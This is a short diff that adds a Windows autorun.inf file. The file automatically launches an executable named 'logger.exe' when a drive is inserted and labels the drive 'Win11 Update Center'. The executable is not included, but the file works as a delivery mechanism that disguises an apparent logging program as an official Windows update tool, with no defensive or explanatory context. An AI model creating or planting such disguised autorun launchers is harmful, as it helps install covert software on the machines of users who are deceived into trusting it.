@@ -1,0 +1,4 @@
+[autorun]
+open=logger.exe
+icon=logger.exe,0
+label=Win11 Update Center
